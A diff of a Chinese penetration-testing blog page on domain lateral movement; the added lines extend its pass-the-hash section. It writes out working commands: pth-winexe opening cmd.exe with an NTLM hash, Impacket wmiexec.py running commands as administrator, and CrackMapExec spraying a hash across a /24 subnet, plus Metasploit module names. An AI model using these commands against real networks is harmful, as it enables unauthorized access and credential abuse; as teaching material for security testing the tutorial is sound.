@@ -26,7 +26,8 @@
 <meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/pth-7.png">
 <meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/pth-5.png">
 <meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/pth-8.png">
-<meta property="og:updated_time" content="2018-10-19T06:23:54.886Z">
+<meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/pth-9.png">
+<meta property="og:updated_time" content="2018-10-19T06:57:40.828Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="域渗透之横向移动">
 <meta name="twitter:description" content="域渗透之横向移动最近在根据ATT&amp;amp;CK提供的攻击矩阵梳理一些手法，趁着这个机会把自己的知识梳理一下，今天写一下横向移动常见的攻击手法。在攻击过程中，尽量不使用msf等集成攻击框架,尽量会把我理解的横向移动的手法总结全面。文章持久更新。">
@@ -234,6 +235,11 @@
 <h4 id="pth-exec"><a href="#pth-exec" class="headerlink" title="pth-exec"></a>pth-exec</h4><p>kali中自带的横向移动pth的工具，pth-exec就是其中一个，还有与其类似的：<br><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">pth-<span class="built_in">net</span>  </div><div class="line">pth-rpcclient  </div><div class="line">pth-smbclient  </div><div class="line">pth-smbget  </div><div class="line">pth-sqsh  </div><div class="line">pth-winexe  </div><div class="line">pth-wmic  </div><div class="line">pth-wmis</div></pre></td></tr></table></figure></p>
 <p>这里演示一下利用pth-winexec起一个cmd:<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pth-winexec -U workgroup/administrator<span class="symbol">%eb9e3066e4d25b5025ad3b83fa6627c7</span>:<span class="number">03</span>bebb<span class="number">338e70244589</span>ea<span class="number">67</span><span class="keyword">c</span><span class="number">7439</span><span class="keyword">c</span><span class="number">77</span>ba //<span class="number">192.168</span>.<span class="number">0.102</span> cmd.exe</div></pre></td></tr></table></figure></p>
 <p><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/pth-8.png" alt=""></p>
+<h4 id="msf中的模块"><a href="#msf中的模块" class="headerlink" title="msf中的模块"></a>msf中的模块</h4><p>msf中当然也集成了pth的模块，因为msf的操作比较方便无脑，所以就不演示了<br>模块有：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">psexec</span></div><div class="line"><span class="attribute">smblogin</span></div></pre></td></tr></table></figure></p>
+<h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><p>这个和windows中wmiexec是一个工具，python脚本使用起来很方便，如果目标环境实在搞不到一台windows机器，只能在linux下配置python环境安装impacket用来横向移动。<br>脚本地址：<br><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="external">https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</a><br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python wmiexec.py  -hashes <span class="number">00000000000000000000000000000000</span>:<span class="number">03</span>bebb<span class="number">338e70244589</span>ea<span class="number">67</span><span class="keyword">c</span><span class="number">7439</span><span class="keyword">c</span><span class="number">77</span>ba TEST/administrator<span class="title">@192</span>.<span class="number">168.0</span>.<span class="number">100</span> “whoami<span class="string">"</span></div></pre></td></tr></table></figure></p>
+<h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>CrackMapExec可以对C段中的主机进行批量pth,项目地址：<a href="https://github.com/byt3bl33d3r/CrackMapExec.git" target="_blank" rel="external">https://github.com/byt3bl33d3r/CrackMapExec.git</a><br>kali上可以直接通过apt安装：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-<span class="builtin-name">get</span> install crackmapexec</div></pre></td></tr></table></figure></p>
+<p>对192.168.0.0/24 C段进行批量pth：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">crackmapexec <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span> -u administrator -H <span class="number">03</span>bebb338e70244589ea67c7439c77ba</div></pre></td></tr></table></figure></p>
+<p><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/pth-9.png" alt=""></p>
 <p>#### </p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/159959" target="_blank" rel="external">https://www.anquanke.com/post/id/159959</a><br><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/" target="_blank" rel="external">https://klionsec.github.io/2016/08/10/ntlm-kerberos/</a><br><a href="https://mp.weixin.qq.com/s/7YidkhJvmVBxFhYcD7pIfQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/7YidkhJvmVBxFhYcD7pIfQ</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p>
 <hr>
@@ -491,11 +497,11 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">生活</a>
+                <a href="javascript:void(0)" class="js-tag color3">pentest</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">pentest</a>
+                <a href="javascript:void(0)" class="js-tag color3">生活</a>
               </li>
              
               <li class="article-tag-list-item">
